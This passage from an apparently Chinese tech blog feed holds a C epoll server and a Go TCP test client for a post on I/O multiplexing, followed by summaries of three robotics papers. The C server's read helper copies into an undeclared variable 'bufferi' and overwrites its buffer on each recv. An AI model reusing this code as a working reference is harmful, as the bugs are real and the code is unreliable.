class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_EVENTS 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PORT 8888</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 1024</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置文件描述符为非阻塞模式</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">set_nonblocking</span><span class="params">(<span class="type">int</span> fd)</span> &#123;</span><br><span class="line">    <span class="type">int</span> flags = fcntl(fd, F_GETFL, <span class="number">0</span>);</span><br><span class="line">    fcntl(fd, F_SETFL, flags | O_NONBLOCK);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">die</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg)</span> &#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">size_t</span> <span class="title function_">mread</span><span class="params">(<span class="type">int</span> client_fd, <span class="type">char</span> *buf, <span class="type">size_t</span> n)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> total_read = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="type">ssize_t</span> count = recv(client_fd, buf, n, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (count == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (errno == EAGAIN || errno == EWOULDBLOCK) &#123;</span><br><span class="line">                <span class="comment">// 数据已读完</span></span><br><span class="line">                <span class="keyword">if</span> (total_read &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;Received %zd bytes from fd %d: %.*s\n&quot;</span>,</span><br><span class="line">                           total_read, client_fd, (<span class="type">int</span>)total_read, buf);</span><br><span class="line">                    send(client_fd, <span class="string">&quot;fsck\n&quot;</span>, <span class="number">5</span>, <span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                perror(<span class="string">&quot;recv&quot;</span>);</span><br><span class="line">                close(client_fd);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (count == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Connection closed by client: fd %d\n&quot;</span>, client_fd);</span><br><span class="line">            close(client_fd);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        total_read += count;</span><br><span class="line">        <span class="built_in">memcpy</span>(bufferi, buf, count);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> total_read;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> listen_sock = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (listen_sock == <span class="number">-1</span>) die(<span class="string">&quot;socket&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置地址复用</span></span><br><span class="line">    <span class="type">int</span> optval = <span class="number">1</span>;</span><br><span class="line">    setsockopt(listen_sock, SOL_SOCKET, SO_REUSEADDR, &amp;optval, <span class="keyword">sizeof</span>(optval));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 绑定地址</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span> =</span> &#123;</span><br><span class="line">        .sin_family = AF_INET,</span><br><span class="line">        .sin_port = htons(PORT),</span><br><span class="line">        .sin_addr.s_addr = INADDR_ANY</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (bind(listen_sock, (<span class="keyword">struct</span> sockaddr*)&amp;addr, <span class="keyword">sizeof</span>(addr))) die(<span class="string">&quot;bind&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 设置为非阻塞模式</span></span><br><span class="line">    set_nonblocking(listen_sock);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (listen(listen_sock, SOMAXCONN)) die(<span class="string">&quot;listen&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> epoll_fd = epoll_create1(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (epoll_fd == <span class="number">-1</span>) die(<span class="string">&quot;epoll_create1&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">event</span> =</span> &#123;</span><br><span class="line">        .events = EPOLLIN | EPOLLET,  <span class="comment">// 边缘触发模式</span></span><br><span class="line">        .data.fd = listen_sock</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">if</span> (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, listen_sock, &amp;event)) die(<span class="string">&quot;epoll_ctl&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 事件循环</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">events</span>[<span class="title">MAX_EVENTS</span>];</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Server started on port %d\n&quot;</span>, PORT);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="type">int</span> n = epoll_wait(epoll_fd, events, MAX_EVENTS, <span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">-1</span>) die(<span class="string">&quot;epoll_wait&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="comment">// 处理新连接</span></span><br><span class="line">            <span class="keyword">if</span> (events[i].data.fd == listen_sock) &#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="number">1</span>) &#123;  <span class="comment">// 必须循环accept直到EAGAIN</span></span><br><span class="line">                    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">client_addr</span>;</span></span><br><span class="line">                    <span class="type">socklen_t</span> addrlen = <span class="keyword">sizeof</span>(client_addr);</span><br><span class="line">                    <span class="type">int</span> client_fd = accept(listen_sock,</span><br><span class="line">                                        (<span class="keyword">struct</span> sockaddr*)&amp;client_addr,</span><br><span class="line">                                        &amp;addrlen);</span><br><span class="line">                    <span class="keyword">if</span> (client_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (errno == EAGAIN || errno == EWOULDBLOCK) &#123;</span><br><span class="line">                            <span class="keyword">break</span>; <span class="comment">// 已接受所有连接</span></span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            die(<span class="string">&quot;accept&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;New connection: fd %d\n&quot;</span>, client_fd);</span><br><span class="line">                    set_nonblocking(client_fd);  <span class="comment">// 必须设置为非阻塞</span></span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 注册客户端socket到epoll（边缘触发）</span></span><br><span class="line">                    event.events = EPOLLIN | EPOLLET | EPOLLRDHUP;</span><br><span class="line">                    event.data.fd = client_fd;</span><br><span class="line">                    <span class="keyword">if</span> (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, client_fd, &amp;event)) &#123;</span><br><span class="line">                        close(client_fd);</span><br><span class="line">                        die(<span class="string">&quot;epoll_ctl client&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 处理客户端事件</span></span><br><span class="line">                <span class="type">int</span> client_fd = events[i].data.fd;</span><br><span class="line">                </span><br><span class="line">                <span class="comment">// 处理连接关闭或错误</span></span><br><span class="line">                <span class="keyword">if</span> (events[i].events &amp; (EPOLLERR | EPOLLHUP | EPOLLRDHUP)) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;Connection closed: fd %d\n&quot;</span>, client_fd);</span><br><span class="line">                    close(client_fd);</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 处理可读事件</span></span><br><span class="line">                <span class="keyword">if</span> (events[i].events &amp; EPOLLIN) &#123;</span><br><span class="line">                    <span class="type">char</span> buf[BUFFER_SIZE];</span><br><span class="line">                    <span class="type">ssize_t</span> total_read = <span class="number">0</span>;</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment">// 必须循环读取直到EAGAIN</span></span><br><span class="line">                    mread(client_fd, buf, BUFFER_SIZE);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(listen_sock);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以及一个向指定 Server 发送指定二进制数据的 Go 程序：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;bufio&quot;</span></span><br><span class="line">    <span class="string">&quot;bytes&quot;</span></span><br><span class="line">    <span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;net&quot;</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line">    <span class="string">&quot;os/signal&quot;</span></span><br><span class="line">    <span class="string">&quot;strings&quot;</span></span><br><span class="line">    <span class="string">&quot;syscall&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(os.Args) &lt; <span class="number">3</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;Usage: go run main.go &lt;host&gt; &lt;port&gt;&quot;</span>)</span><br><span class="line">        os.Exit(<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    host := os.Args[<span class="number">1</span>]</span><br><span class="line">    port := os.Args[<span class="number">2</span>]</span><br><span class="line">    address := net.JoinHostPort(host, port)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Connect to the server</span></span><br><span class="line">    conn, err := net.Dial(<span class="string">&quot;tcp&quot;</span>, address)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Printf(<span class="string">&quot;Error connecting to server: %v\n&quot;</span>, err)</span><br><span class="line">        os.Exit(<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> conn.Close()</span><br><span class="line"></span><br><span class="line">    fmt.Printf(<span class="string">&quot;Connected to %s\n&quot;</span>, address)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Channel to handle graceful shutdown</span></span><br><span class="line">    exitChan := <span class="built_in">make</span>(<span class="keyword">chan</span> os.Signal, <span class="number">1</span>)</span><br><span class="line">    signal.Notify(exitChan, os.Interrupt, syscall.SIGTERM)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Goroutine to listen for server messages</span></span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        reader := bufio.NewReader(conn)</span><br><span class="line">        <span class="keyword">for</span> &#123;</span><br><span class="line">            message, err := reader.ReadString(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                fmt.Println(<span class="string">&quot;Connection closed by server.&quot;</span>)</span><br><span class="line">                exitChan &lt;- syscall.SIGTERM</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            &#125;</span><br><span class="line">            fmt.Printf(<span class="string">&quot;Server: %s&quot;</span>, message)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Goroutine to handle user input and send data to server</span></span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        scanner := bufio.NewScanner(os.Stdin)</span><br><span class="line">        <span class="keyword">for</span> &#123;</span><br><span class="line">            fmt.Print(<span class="string">&quot;Enter data to send (\\x?? for hex bytes): &quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> scanner.Scan() &#123;</span><br><span class="line">                input := scanner.Text()</span><br><span class="line">                data, err := parseInput(input)</span><br><span class="line">                <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                    fmt.Printf(<span class="string">&quot;Invalid input: %v\n&quot;</span>, err)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                &#125;</span><br><span class="line">                _, err = conn.Write(data)</span><br><span class="line">                <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                    fmt.Printf(<span class="string">&quot;Error sending data: %v\n&quot;</span>, err)</span><br><span class="line">                    exitChan &lt;- syscall.SIGTERM</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                fmt.Println(<span class="string">&quot;Input closed.&quot;</span>)</span><br><span class="line">                exitChan &lt;- syscall.SIGTERM</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Wait for interrupt signal</span></span><br><span class="line">    &lt;-exitChan</span><br><span class="line">    fmt.Println(<span class="string">&quot;Exiting program.&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// parseInput converts user input with \x?? hex sequences into a byte slice</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">parseInput</span><span class="params">(input <span class="type">string</span>)</span></span> ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> buffer bytes.Buffer</span><br><span class="line"></span><br><span class="line">    parts := strings.Split(input, <span class="string">&quot;\\x&quot;</span>)</span><br><span class="line">    buffer.WriteString(parts[<span class="number">0</span>]) <span class="comment">// Add any text before the first \x</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">1</span>; i &lt; <span class="built_in">len</span>(parts); i++ &#123;</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(parts[i]) &lt; <span class="number">2</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;incomplete hex byte: \\x%s&quot;</span>, parts[i])</span><br><span class="line">        &#125;</span><br><span class="line">        hexByte := parts[i][:<span class="number">2</span>]</span><br><span class="line">        rest := parts[i][<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">        b, err := hex.DecodeString(hexByte)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;invalid hex byte: \\x%s&quot;</span>, hexByte)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        buffer.Write(b)</span><br><span class="line">        buffer.WriteString(rest) <span class="comment">// Add any remaining text after the hex byte</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> buffer.Bytes(), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近总结了一些 OS I/O 多路复用的知识。之前对 I/O Multiplexer 的认知还停留在 &lt;code&gt;select&lt;/code&gt; 系统调用，现在是时候扩展一下视野了。&lt;/p&gt;
&lt;h3 id=&quot;1-从-Socket-模型开始&quot;&gt;&lt;a href=&quot;#1-从-Sock</summary>
      
    
    
    
    <category term="review" scheme="https://blog.sjtuxhw.top/categories/review/"/>
    
    
    <category term="OS" scheme="https://blog.sjtuxhw.top/tags/OS/"/>
    
    <category term="IO" scheme="https://blog.sjtuxhw.top/tags/IO/"/>
    
  </entry>
  
  <entry>
    <title>具身智能论文速读3篇 2025年3月</title>
    <link href="https://blog.sjtuxhw.top/technical/embodied-3-papers-202503/"/>
    <id>https://blog.sjtuxhw.top/technical/embodied-3-papers-202503/</id>
    <published>2025-03-02T15:36:58.000Z</published>
    <updated>2025-03-03T16:04:19.779Z</updated>
    
    <content type="html"><![CDATA[<h2 id="HumanUP-Learning-Getting-Up-Policies-for-Real-World-Humanoid-Robots"><a href="#HumanUP-Learning-Getting-Up-Policies-for-Real-World-Humanoid-Robots" class="headerlink" title="HumanUP: Learning Getting-Up Policies for Real-World Humanoid Robots"></a>HumanUP: Learning Getting-Up Policies for Real-World Humanoid Robots</h2><p>主旨：如何通过强化学习（RL）和仿真到现实（Sim-to-Real）的方法，为人形机器人开发能够从不同跌倒姿势和不同地形中自主起身的控制策略；</p><p>背景：人形机器人在实际应用中容易跌倒，而手动设计控制器来处理各种跌倒姿势和复杂地形非常困难。现有的控制器通常只能处理有限的跌倒情况，缺乏泛化能力。因此，论文提出了一种基于学习的框架，通过仿真训练生成能够在真实世界中应对多种跌倒姿势和地形的起身策略。目前的挑战有：</p><ul><li><strong>非周期性行为</strong>：起身任务不像行走那样有固定的周期性接触模式，接触序列需要动态调整。</li><li><strong>丰富的接触</strong>：起身过程中，机器人不仅依靠脚部接触地面，还可能利用身体其他部位（如手臂、躯干）来施加力。</li><li><strong>稀疏奖励</strong>：起身任务的奖励信号较为稀疏，机器人需要在长时间内做出正确的动作才能获得奖励。</li></ul><p><img src="imgs/HumanUP.png" /></p><p>论文的解决方案 <strong>HumanUP</strong>：</p><ul><li><p><strong>第一阶段（Stage I）</strong>：在仿真中发现一个有效的起身轨迹，不考虑动作的平滑性或速度/扭矩限制。这一阶段的目标是找到能够完成任务的轨迹，即使动作可能不够平滑或安全。</p><blockquote><p>under minimal constraints on smoothness or speed / torque limits</p></blockquote></li><li><p><strong>第二阶段（Stage II）</strong>：在第一阶段发现的轨迹基础上，训练一个 deployable 的策略，确保动作平滑、速度适中，并且能够适应不同的初始姿势和地形。</p><blockquote><p>Stage II is optimized to track the state trajectory discovered in the first stage to tackle easier motion tracking with dense tracking rewards, which is under strict Sim2Real control regularization for ensuring Sim2Real transfer. From Stage I to Stage II, we employ a Sim2Real learning curriculum that progresses from simplified → full collision mesh, canonical → random initial lying posture, and weak to strong control regularization and domain randomization. This two-stage approach integrates a hard-to-easy task-solving curriculum with an easy-to-hard Sim2Real curriculum, both of which are crucial for successful learning, as demonstrated in our experiments.</p><p>第二阶段的优化目的是跟踪第一阶段发现的状态轨迹，以密集的跟踪奖励解决更容易的运动跟踪问题，这是在严格的 Sim2Real 控制正则化下进行的，以确保 Sim to Real 的效果。从第一阶段到第二阶段，我们采用 Sim2Real Learning，从简化→全碰撞网格、规范→随机初始卧姿、弱控制正则化和域随机化到强控制正则化。正如我们的实验所证明的那样，这种两阶段方法将由难变易的任务解决方案与由易变难的 Sim2Real 方案整合在一起，两者对于成功学习都至关重要。</p></blockquote></li></ul><p>实验操作：</p><ul><li>仿真和真实世界都使用 Unitree G1 平台；机器人自由度等信息请参见论文的 Page 5；</li><li>Isaac Gym for simulated training and evaluation.</li><li>从 task success、smoothness、safety 几个方面打分、构造强化学习的奖励函数；</li></ul><p>实验结果：</p><ul><li><strong>仿真实验</strong>：HumanUP 能够在多种地形和初始姿势下成功完成起身任务，表现优于其他 baseline 方法；</li><li><strong>真实世界实验</strong>：HumanUP 能够在多种复杂地形（如草地、雪地、斜坡等）上成功起身，且成功率显著高于 G1 机器人自带的控制器。</li></ul><p>不足：</p><ul><li>It relies on high performance physics platforms like IsaacGym to simulate contact-rich tasks such as getting up and rolling over. 当前的仿真平台在接触动力学模拟上仍有不足，未来需要更精确的仿真工具；</li><li>学习到的动作可能不够拟人化，未来可以通过引入人类动作捕捉数据来改进；</li></ul><h2 id="DexTrack-Towards-Generalizable-Neural-Tracking-Control-for-Dexterous-Manipulation-from-Human-References"><a href="#DexTrack-Towards-Generalizable-Neural-Tracking-Control-for-Dexterous-Manipulation-from-Human-References" class="headerlink" title="DexTrack: Towards Generalizable Neural Tracking Control for Dexterous Manipulation from Human References"></a>DexTrack: Towards Generalizable Neural Tracking Control for Dexterous Manipulation from Human References</h2><p>主要目标是开发一种通用的神经跟踪控制器（neural tracking controller），用于灵巧手从人类参考中学习并进行复杂的物体操作。</p><p>背景目前的问题：当前的强化学习（RL）和轨迹优化（TO）方法通常依赖于任务特定的奖励或精确的系统模型，限制了其通用性和适应性；</p><blockquote><p>他们大多需要对单独的任务进行针对性的设计，例如专门对某一种特定的任务设计对应的奖励函数，之后根据这样的奖励函数训练策略网络来解决对应的问题；</p></blockquote><p>数据采集：两个公开的人类-物体交互数据集（GRAB 和 TACO）上进行实验，分别包含日常操作和功能性工具使用操作。</p><blockquote><p>仿真：use the Allegro hand, with URDF adapted from Isaac Gym Envs</p><p>真实世界：LEAP hand</p></blockquote><p>训练怎么表示任务？</p><ul><li>比如将物体转动一个角度，我们可以先规划出来物体的运动轨迹，之后将这个任务转化为跟踪物体运动轨迹的轨迹跟踪任务。</li><li>在每个时刻，给定机器手和物体当前的状态，以及下一步想要达到的状态，轨迹跟踪控制器的任务是给出机器手当前应该执行的动作，从而通过执行该动作，机器手可以运动且和物体进行交互，使得机器手以及物体实际达到的状态与下一步想要达到的状态吻合。</li></ul><p><img src="imgs/DexTrack.png" /></p><p>训练的指标：包括物体旋转误差、物体平移误差、手腕位置和旋转误差、手指位置误差以及成功率；</p><p>训练 controller：强化学习 + 模仿学习。</p><ul><li><p>RL 用于处理复杂的动态环境；</p></li><li><p>IL 则通过模仿高质量的机器人跟踪演示来提高控制器的性能（to distill successful, abundant, and diverse “tracking knowledge” into the tracking controller）。</p><blockquote><p>在 RL 训练的同时引入监督信号来降低 policy 学习的难度。通过交替地使用高质量的轨迹跟踪数据辅助通用轨迹跟踪控制器的学习，以及借助通用轨迹跟踪器来提高单一轨迹跟踪演示的质量；</p></blockquote></li></ul><p>优化算法（如何优化 “单一轨迹跟踪演示的质量”）：</p><ul><li>借助通用轨迹跟踪器（之前 train 的）来初始化单一轨迹跟踪策略的学习；</li><li>借助 homotopy optimization 的方式，通过解决一系列的优化任务来降低特定轨迹跟踪任务优化的难度；</li></ul><p>baseline：与现有的模型无关方法（如 DGrasp 和 PPO）进行比较；</p><p>结果：DexTrack 在模拟和现实世界中的表现均优于基线方法，成功率提高了 10% 以上。特别是在处理复杂操作、薄物体和动态接触时表现出色。</p><h2 id="DexGraspVLA-A-Vision-Language-Action-Framework-Towards-General-Dexterous-Grasping"><a href="#DexGraspVLA-A-Vision-Language-Action-Framework-Towards-General-Dexterous-Grasping" class="headerlink" title="DexGraspVLA: A Vision-Language-Action Framework Towards General Dexterous Grasping"></a>DexGraspVLA: A Vision-Language-Action Framework Towards General Dexterous Grasping</h2><p>实现 <strong>通用灵巧抓取</strong>（General Dexterous Grasping）！</p><p>论文设计了一个 VLA 框架，结合了预训练的视觉-语言模型（VLM）作为高层任务规划器（Planner），以及基于扩散模型（Diffusion-based Policy）的低层动作控制器（Controller）。</p><p><strong><u>模仿学习 + pretrained VLMs</u></strong>！</p><ul><li><strong>高层规划器（Planner）</strong>：使用预训练的视觉-语言模型（如 Qwen-VL-Chat）来解析用户指令，规划抓取任务，并为低层控制器提供监督信号。规划器能够处理多模态输入，执行视觉定位（Visual Grounding），并根据用户指令生成抓取任务的分解。</li><li><strong>低层控制器（Controller）</strong>：基于扩散模型的动作控制器，负责生成闭环的动作序列。控制器通过分割模型（如 SAM 和 Cutie）获取目标物体的掩码（Mask），并使用预训练的视觉编码器（如 DINOv2）提取图像特征。这些特征与机器人本体感知状态（Proprioception）结合，通过扩散模型生成多步动作序列。</li></ul><p>数据采集：为了训练 DexGraspVLA 的低层控制器，研究团队手动收集了2094 个成功的抓取演示数据，涵盖了36 种家庭用品，涉及不同的尺寸、重量、几何形状、纹理和材料。每个演示记录了机器人手腕和头部摄像头的图像、本体感知状态、物体掩码以及动作序列。</p><blockquote><p>我好像没找到采集的具体方法？</p></blockquote><p><img src="imgs/DexGraspVLA.png" width="550px" 